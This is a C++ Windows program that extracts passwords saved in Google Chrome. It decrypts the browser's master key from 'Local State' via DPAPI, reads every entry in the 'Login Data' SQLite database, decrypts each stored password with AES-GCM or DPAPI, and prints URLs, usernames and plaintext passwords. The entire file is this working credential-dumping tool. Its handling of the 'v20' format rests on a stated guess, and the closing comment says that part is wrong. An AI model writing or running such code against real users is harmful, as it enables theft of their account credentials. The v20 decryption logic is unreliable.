#ifdef _MSC_VER
#define _CRT_SECURE_NO_WARNINGS
#endif

#include <Windows.h>
#include <wincrypt.h>
#include <bcrypt.h>
#include <iostream>
#include <fstream>
#include <vector>
#include <string>
#include <shlobj.h>
#include <codecvt>
#include "json.hpp"
#include "sqlite3.h"

#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "bcrypt.lib")

using namespace std;
using json = nlohmann::json;

// Decrypt using DPAPI (for master key or old encrypted blobs), returns binary data
vector<unsigned char> DecryptDPAPI(const vector<unsigned char>& encrypted) {
    DATA_BLOB inBlob{ static_cast<DWORD>(encrypted.size()), const_cast<BYTE*>(encrypted.data()) };
    DATA_BLOB outBlob;
    if (!CryptUnprotectData(&inBlob, nullptr, nullptr, nullptr, nullptr, 0, &outBlob)) {
        throw runtime_error("DPAPI decryption failed");
    }
    vector<unsigned char> result(outBlob.pbData, outBlob.pbData + outBlob.cbData);
    LocalFree(outBlob.pbData);
    return result;
}

// Read entire file into a string
string ReadFile(const string& path) {
    ifstream file(path, ios::binary);
    if (!file.is_open()) throw runtime_error("Failed to open file");
    return string((istreambuf_iterator<char>(file)), istreambuf_iterator<char>());
}

// Decode base64
vector<unsigned char> Base64Decode(const string& base64) {
    DWORD size = 0;
    CryptStringToBinaryA(base64.c_str(), 0, CRYPT_STRING_BASE64, nullptr, &size, nullptr, nullptr);
    vector<unsigned char> decoded(size);
    if (!CryptStringToBinaryA(base64.c_str(), 0, CRYPT_STRING_BASE64, decoded.data(), &size, nullptr, nullptr)) {
        throw runtime_error("Base64 decoding failed");
    }
    return decoded;
}

// AES-GCM decrypt helper (used for v10/v11 and also for v20 ciphertexts)
bool AESGCMDecrypt(
    const vector<unsigned char>& ciphertext,
    const vector<unsigned char>& key,
    string& out_plaintext)
{
    if (ciphertext.size() < 3 + 12 + 16 + 1) {
        return false;
    }
    // Check prefix "v??"
    if (!(ciphertext[0] == 'v' && ciphertext[1] >= '0' && ciphertext[1] <= '9')) {
        return false;
    }

    const unsigned char* iv = &ciphertext[3];
    const unsigned char* tag = &ciphertext[ciphertext.size() - 16];
    size_t ciphertext_len = ciphertext.size() - 3 - 12 - 16;
    const unsigned char* encrypted = &ciphertext[3 + 12]; // 3 (prefix) + 12 (IV) = 15

    if (key.size() != 32) {
        return false;
    }

    vector<unsigned char> plaintext(ciphertext_len);

    BCRYPT_ALG_HANDLE hAlg = nullptr;
    BCRYPT_KEY_HANDLE hKey = nullptr;

    NTSTATUS status = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0);
    if (!BCRYPT_SUCCESS(status)) {
        return false;
    }

    status = BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_GCM, sizeof(BCRYPT_CHAIN_MODE_GCM), 0);
    if (!BCRYPT_SUCCESS(status)) {
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return false;
    }

    status = BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0, (PUCHAR)key.data(), (ULONG)key.size(), 0);
    if (!BCRYPT_SUCCESS(status)) {
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return false;
    }

    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo;
    BCRYPT_INIT_AUTH_MODE_INFO(authInfo);
    authInfo.pbNonce = (PUCHAR)iv;
    authInfo.cbNonce = 12;

    // ** FIX HERE: Pass the 3-byte prefix as AAD (Additional Authenticated Data) **
    authInfo.pbAuthData = (PUCHAR)ciphertext.data();  // pointer to prefix (first 3 bytes)
    authInfo.cbAuthData = 3;                          // length of prefix "v10", "v20", etc.

    authInfo.pbTag = (PUCHAR)tag;
    authInfo.cbTag = 16;
    authInfo.cbMacContext = 0;
    authInfo.dwFlags = 0;

    ULONG result_len = 0;
    status = BCryptDecrypt(hKey,
        (PUCHAR)encrypted,
        (ULONG)ciphertext_len,
        &authInfo,
        NULL,
        0,
        plaintext.data(),
        (ULONG)plaintext.size(),
        &result_len,
        0);

    BCryptDestroyKey(hKey);
    BCryptCloseAlgorithmProvider(hAlg, 0);

    if (!BCRYPT_SUCCESS(status)) {
        return false;
    }

    out_plaintext.assign((char*)plaintext.data(), result_len);
    return true;
}

// Decrypt AES-GCM v10 or v11
string DecryptAESGCMv10(const vector<unsigned char>& encrypted, const vector<unsigned char>& masterKey) {
    string decrypted;
    if (AESGCMDecrypt(encrypted, masterKey, decrypted)) {
        return decrypted;
    }
    return "";
}

// Decrypt v20 encrypted password:
// 1) Extract the v20 encrypted master key (encrypted with DPAPI + AES-GCM, stored somewhere or passed as input?)
//    Since we only have the password blob, the "encrypted key" for v20 is the DPAPI-encrypted master key from Local State already decrypted,
//    so the assumption: the password blob in v20 is encrypted directly with AES-GCM using the decrypted masterKey from Local State.
//
// So for v20, we can try just AES-GCM decrypting the password blob with the masterKey.
//
// Hypothesis: The masterKey used in v20 is the one from Local State after DPAPI decrypt. So treat v20 password blobs same as v10 but prefix is v20.
//
// This matches Chrome 112+ changes where prefix changes to "v20" and the rest format is similar.

// So implement as:

string DecryptAESGCMv20(const vector<unsigned char>& encrypted, const vector<unsigned char>& masterKey) {
    // Must be prefix "v20"
    if (encrypted.size() < 3 || encrypted[0] != 'v' || encrypted[1] != '2' || encrypted[2] != '0') {
        return "";
    }
    // Just call AESGCMDecrypt with masterKey
    string decrypted;
    if (AESGCMDecrypt(encrypted, masterKey, decrypted)) {
        return decrypted;
    }
    return "";
}

// Automatically try AES-GCM v10/v11 or v20 or fallback to DPAPI
string DecryptPasswordUniversal(const vector<unsigned char>& encrypted, const vector<unsigned char>& masterKey) {
    cout << "[DEBUG] DecryptPasswordUniversal called\n";

    if (encrypted.size() >= 3 && encrypted[0] == 'v') {
        if (encrypted[1] == '1' && (encrypted[2] == '0' || encrypted[2] == '1')) {
            string decrypted = DecryptAESGCMv10(encrypted, masterKey);
            if (!decrypted.empty()) {
                return decrypted;
            }
            else {
                return "[decryption failed - AES-GCM v10/v11]";
            }
        }
        else if (encrypted[1] == '2' && encrypted[2] == '0') {
            cout << "[DEBUG] Detected v20 encrypted password format" << endl;
            string decrypted = DecryptAESGCMv20(encrypted, masterKey);
            if (!decrypted.empty()) {
                return decrypted;
            }
            else {
                return "[decryption failed - AES-GCM v20]";
            }
        }
    }

    // Fallback DPAPI (no prefix)
    try {
        vector<unsigned char> decryptedBytes = DecryptDPAPI(encrypted);
        return string(decryptedBytes.begin(), decryptedBytes.end());
    }
    catch (...) {
        return "[decryption failed - unknown format]";
    }
}

int main() {
    try {
        // Get user profile path
        char* userProfile = getenv("USERPROFILE");
        if (!userProfile) {
            cerr << "USERPROFILE environment variable not found" << endl;
            return 1;
        }

        // Paths to Chrome data files
        string loginDataPath = string(userProfile) + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data";
        string localStatePath = string(userProfile) + "\\AppData\\Local\\Google\\Chrome\\User Data\\Local State";

        // Read and parse Local State JSON
        json localStateJson = json::parse(ReadFile(localStatePath));
        string encryptedKeyB64 = localStateJson["os_crypt"]["encrypted_key"];
        vector<unsigned char> encryptedKey = Base64Decode(encryptedKeyB64);

        // Remove "DPAPI" prefix (5 bytes)
        vector<unsigned char> encryptedKeyNoPrefix(encryptedKey.begin() + 5, encryptedKey.end());

        // Decrypt master key
        vector<unsigned char> masterKey = DecryptDPAPI(encryptedKeyNoPrefix);
        cout << "[DEBUG] masterKey length: " << masterKey.size() << endl;

        // Open Login Data SQLite DB
        sqlite3* db;
        if (sqlite3_open(loginDataPath.c_str(), &db) != SQLITE_OK) {
            cerr << "Failed to open Login Data SQLite DB" << endl;
            return 1;
        }

        const char* query = "SELECT origin_url, username_value, password_value FROM logins";
        sqlite3_stmt* stmt;

        if (sqlite3_prepare_v2(db, query, -1, &stmt, nullptr) != SQLITE_OK) {
            cerr << "Failed to prepare SQL query" << endl;
            sqlite3_close(db);
            return 1;
        }

        // Iterate over rows
        while (sqlite3_step(stmt) == SQLITE_ROW) {
            string url = (const char*)sqlite3_column_text(stmt, 0);
            string username = (const char*)sqlite3_column_text(stmt, 1);

            const unsigned char* encPassBlob = (const unsigned char*)sqlite3_column_blob(stmt, 2);
            int passLen = sqlite3_column_bytes(stmt, 2);
            vector<unsigned char> encryptedPassword(encPassBlob, encPassBlob + passLen);

            // Debug: Print encrypted password info
            cout << "[Encrypted password size]: " << encryptedPassword.size() << endl;
            cout << "[Encrypted password hex]: ";
            for (unsigned char c : encryptedPassword) {
                printf("%02x", c);
            }
            cout << endl;

            string decrypted = DecryptPasswordUniversal(encryptedPassword, masterKey);

            cout << "[URL] " << url << endl;
            cout << "[User] " << username << endl;
            cout << "[Pass] " << decrypted << endl << endl;
        }

        sqlite3_finalize(stmt);
        sqlite3_close(db);
    }
    catch (const exception& e) {
        cerr << "Exception: " << e.what() << endl;
        return 1;
    }

    return 0;
}

// Note: This code assumes you have the necessary libraries (json.hpp, sqlite3.h) and linked them correctly.

// I realised how to fix the v20 decryption and the code is therefore wrong as of now, it will be fixed in the next commit.